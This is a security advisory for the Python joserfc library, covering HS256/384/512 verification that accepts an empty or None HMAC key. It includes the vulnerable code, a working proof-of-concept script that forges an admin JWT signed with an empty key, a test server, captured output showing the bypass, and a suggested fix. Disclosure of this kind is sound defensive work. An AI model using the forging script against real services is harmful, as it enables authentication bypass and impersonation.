# [H] joserfc: HS256/HS384/HS512 verify accepts empty/nil HMAC key (cross-language sibling of CVE-2026-45363)

## Summary
Severity: High
Advisory: GHSA-gg9x-qcx2-xmrh
CVE: CVE-2026-49852
CWE: CWE-1391, CWE-287, CWE-326
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-gg9x-qcx2-xmrh
Type: github-advisory

## Affected
- PyPI: `joserfc` — affected >=0 <1.6.8

## Details
### Summary

`joserfc.jwt.decode` accepts attacker-forged HMAC-signed tokens when the
caller-supplied verification key is the empty string or `None`.
`HMACAlgorithm.sign` and `HMACAlgorithm.verify` in
[`src/joserfc/_rfc7518/jws_algs.py:62-70`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70) feed whatever
`OctKey.get_op_key(...)` produced into `hmac.new(...)`, and `OctKey.import_key`
only emits a `SecurityWarning` when the raw key is shorter than 14 bytes
without rejecting zero-length input. Any application whose JWT secret is
sourced from an unset environment variable, an unset Redis / DB row, a key
finder fallback that returns `""`, or a `Hash.new("")`-style default verifies
attacker tokens forged with `HMAC(key=b"", signing_input)` because the
attacker trivially reproduces the same digest with no secret knowledge.

This is a cross-language sibling of jwt/ruby-jwt GHSA-c32j-vqhx-rx3x /
CVE-2026-45363 (HS256/HS384/HS512 verify accepted an empty/nil HMAC key,
filed 2026-05-13). ruby-jwt v3.2.0 added an `ensure_valid_key!` precondition
that rejects empty keys at both sign and verify entry; joserfc has no
equivalent. (The same primitive lives in the deprecated `authlib.jose`
module by the same maintainer; filing this advisory against joserfc
alongside a separate `authlib` advisory because the codebases are
independent shipping artifacts on PyPI.)

### Affected versions

`joserfc` (PyPI) `<= 1.6.7` (latest published release reproduces). No
patched release.

### Privilege required

Unauthenticated. Any HTTP / RPC endpoint that calls `joserfc.jwt.decode`
with a verification key sourced from configuration is reachable. The
condition that makes the bug observable is operator-side: the configured
secret resolves to `""` or `None`. Common patterns that produce this state
in production:

- `OctKey.import_key(os.environ.get("JWT_SECRET", ""))`
- A key finder callable that returns `""` / `None` for an unknown `kid`
- Default values like `os.getenv("SECRET") or ""`, `cfg.get("secret", "")`
- Database / Redis row lookup that returns `""` for a missing row

### Vulnerable code

[`src/joserfc/_rfc7518/jws_algs.py:43-70`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L43-L70):

```python
class HMACAlgorithm(JWSAlgModel):
    SHA256 = hashlib.sha256
    SHA384 = hashlib.sha384
    SHA512 = hashlib.sha512

    def __init__(self, sha_type, recommended=False):
        self.name = f"HS{sha_type}"
        self.description = f"HMAC using SHA-{sha_type}"
        self.recommended = recommended
        self.hash_alg = getattr(self, f"SHA{sha_type}")
        self.algorithm_security = sha_type

    def sign(self, msg: bytes, key: OctKey) -> bytes:
        op_key = key.get_op_key("sign")
        return hmac.new(op_key, msg, self.hash_alg).digest()

    def verify(self, msg: bytes, sig: bytes, key: OctKey) -> bool:
        op_key = key.get_op_key("verify")
        v_sig = hmac.new(op_key, msg, self.hash_alg).digest()
        return hmac.compare_digest(sig, v_sig)
```

[`src/joserfc/_rfc7518/oct_key.py:52-63`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/oct_key.py#L52-L63):

```python
@classmethod
def import_key(cls, value, parameters=None, password=None) -> "OctKey":
    key: OctKey = super(OctKey, cls).import_key(value, parameters, password)
    if len(key.raw_value) < 14:
        # https://csrc.nist.gov/publications/detail/sp/800-131a/rev-2/final
        warnings.warn("Key size should be >= 112 bits", SecurityWarning)
    return key
```

The `< 14` check only warns; `len(key.raw_value) == 0` falls through and is
returned to the caller. `HMACAlgorithm.verify` then calls
`hmac.compare_digest(sig, hmac.new(b"", signing_input, sha256).digest())`,
and Python's `hmac.new(b"", ...)` accepts the empty key.

Cross-language sibling of ruby-jwt's fix in [`lib/jwt/jwa/hmac.rb`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/lib/jwt/jwa/hmac.rb):

```ruby
def ensure_valid_key!(key)
  raise_verify_error!('HMAC key expected to be a String') unless key.is_a?(String)
  raise_verify_error!('HMAC key cannot be empty') if key.empty?
end
```

invoked from both `sign(signing_key:)` and `verify(verification_key:)`.
PyJWT landed an equivalent guard in 2.13.0 (`HMACAlgorithm.prepare_key`
raises `InvalidKeyError("HMAC key must not be empty.")` for `len(key_bytes) == 0`).
firebase/php-jwt rejects empty material in `Key.__construct`. jjwt enforces a
256-bit minimum in `DefaultMacAlgorithm.validateKey`. joserfc has the
strongest existing length-warning logic but stops at `< 14 bytes` warn
rather than `== 0` reject.

### How an empty `JWT_SECRET` reaches `hmac.new`

1. The application calls `joserfc.jwt.decode(value, key, algorithms=["HS256"])`
   where `key = OctKey.import_key("")` (or `OctKey.import_key(b"")`,
   or any custom path that yields an `OctKey` whose `raw_value` is `b""`).
2. `decode` ([`src/joserfc/jwt.py:86-117`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/jwt.py#L86-L117)) calls `_decode_jws(...)` →
   `deserialize_compact(value, key, algorithms, registry)`.
3. `deserialize_compact` ([`src/joserfc/jws.py`](https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/jws.py)) dispatches to
   `HMACAlgorithm.verify(signing_input, signature, key)`.
4. `verify` calls `key.get_op_key("verify")` → returns `b""`.
5. `hmac.new(b"", signing_input, sha256).digest()` is computed; the
   attacker computed exactly that digest with the same empty key, so
   `hmac.compare_digest` returns `True` and decode succeeds.

No upstream `nil`-check, no length check, no schema rejection. The path is
reached from the public `joserfc.jwt.decode` API.

### Proof of concept

Attacker (no secret knowledge):

```python
import base64, hmac, hashlib, json, time
def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
now = int(time.time())
payload = b64url(json.dumps({
    "sub": "attacker", "admin": True,
    "iat": now, "exp": now + 600,
}).encode())
signing_input = header + b"." + payload
sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
forged = signing_input + b"." + b64url(sig)
print(forged.decode())
```

Server harness:

```python
# server.py
from joserfc import jwt
from joserfc.jwk import OctKey
import os
from wsgiref.simple_server import make_server

def app(environ, start_response):
    auth = environ.get("HTTP_AUTHORIZATION", "")
    token = auth[len("Bearer "):].strip() if auth.startswith("Bearer ") else ""
    key = OctKey.import_key(os.environ.get("JWT_SECRET", ""))  # default = ""
    try:
        tok = jwt.decode(token, key, algorithms=["HS256"])
        c = tok.claims
        body = ("OK: sub=%r admin=%r\n" % (c.get("sub"), c.get("admin"))).encode()
        start_response("200 OK", [("Content-Type", "text/plain")])
        return [body]
    except Exception as e:
        start_response("401 Unauthorized", [("Content-Type", "text/plain")])
        return [("DENY: %s\n" % e).encode()]

make_server("127.0.0.1", 8383, app).serve_forever()
```

### End-to-end reproduction (against `pip install joserfc==1.6.7`)

```bash
# 1. Boot the WSGI server. JWT_SECRET unset to model the misconfigured-secret
#    state.
python3.12 -m venv venv
./venv/bin/pip install joserfc==1.6.7
./venv/bin/python server.py &   # listens on :8383

# 2. Run the attacker
./venv/bin/python attacker.py
```

Captured run output (canonical pre-fix run, joserfc 1.6.7,
`poc-attacker-empty-20260523-150949.log`):

```
forged token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYXR0YWNrZXIiLCAiYWRtaW4iOiB0cnVlLCAiaWF0IjogMTc3OTUyMDU4OSwgImV4cCI6IDE3Nzk1MjExODl9.yE8nFmSVmQJ2Slft-BlxD04ypabkV128XbPcU6SRnBY
HTTP 200
OK: sub='attacker' admin=True
```

Control (real 256-bit secret, `poc-control-realkey-20260523-150959.log`):

```
forged token: eyJhbGciOiAiSFMyNTYi...
HTTP 401
DENY: BadSignatureError: bad_signature:
```

Interpretation:

| Configuration                | Observed                            | Expected |
|------------------------------|-------------------------------------|----------|
| `JWT_SECRET` unset (== "")   | HTTP 200, `admin=True` (verified)   | HTTP 401 |
| `JWT_SECRET` = 256-bit value | HTTP 401, `BadSignatureError`       | HTTP 401 |

The first row demonstrates that an attacker with zero knowledge of the
verification secret reaches the protected path by signing with the empty
key. The second row confirms the verifier behaves correctly when the
secret is non-empty, proving the bug is gated only on the secret being
empty rather than on any structural defect in the attacker's token.

Fix verification: with the suggested empty-key reject wired into
`HMACAlgorithm.sign` / `.verify`, the empty-secret server re-run rejects
the same forged token with `ValueError: HMAC key must not be empty`.

### Impact

- Complete authentication bypass on any service whose key finder resolves
  to `""` / `None` (env var unset, DB row missing, fallback). Attacker
  forges arbitrary claims (`sub`, `admin`, scopes, audience, expiry).
- The misconfiguration that triggers the bug is silent: the server does
  not fail to boot, joserfc emits a single `SecurityWarning` ("Key size
  should be >= 112 bits") at `OctKey.import_key` time and then proceeds.
- Severity matches the parent (ruby-jwt CVE-2026-45363, CVSS 7.4 high).
  CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N — AC:H because of the
  operator-misconfiguration precondition; impact otherwise matches
  authentication bypass.

### Suggested fix

Upgrade the existing `< 14 bytes` warning in `OctKey.import_key` to a hard
reject at `len(key.raw_value) == 0`, plus a defence-in-depth check in
`HMACAlgorithm.sign` and `HMACAlgorithm.verify` after
`key.get_op_key(...)`:

```python
# src/joserfc/_rfc7518/oct_key.py
@classmethod
def import_key(cls, value, parameters=None, password=None) -> "OctKey":
    key: OctKey = super(OctKey, cls).import_key(value, parameters, password)
    if not key.raw_value:
        raise ValueError("oct key material must not be empty")
    if len(key.raw_value) < 14:
        warnings.warn("Key size should be >= 112 bits", SecurityWarning)
    return key

# src/joserfc/_rfc7518/jws_algs.py
class HMACAlgorithm(JWSAlgModel):
    ...
    def sign(self, msg: bytes, key: OctKey) -> bytes:
        op_key = key.get_op_key("sign")
        if not op_key:
            raise ValueError("HMAC key must not be empty")
        return hmac.new(op_key, msg, self.hash_alg).digest()

    def verify(self, msg: bytes, sig: bytes, key: OctKey) -> bool:
        op_key = key.get_op_key("verify")
        if not op_key:
            raise ValueError("HMAC key must not be empty")
        v_sig = hmac.new(op_key, msg, self.hash_alg).digest()
        return hmac.compare_digest(sig, v_sig)
```

The two-layer fix mirrors PyJWT 2.13.0's approach (reject empty in
`prepare_key`, plus the runtime length checks the underlying hmac
primitive does not perform).

### Fix PR

`authlib/joserfc-ghsa-gg9x-qcx2-xmrh#1` (temp private fork PR), branch
`fix/hmac-reject-empty-key`, base `main`. URL:
https://github.com/authlib/joserfc-ghsa-gg9x-qcx2-xmrh/pull/1

### Credit

Reported by tonghuaroot.

## References
- https://github.com/authlib/joserfc/security/advisories/GHSA-gg9x-qcx2-xmrh
- https://github.com/authlib/joserfc/commit/86d00910b2b2d2d07503fee9b572906daefab7f1
- https://github.com/authlib/joserfc
- https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70
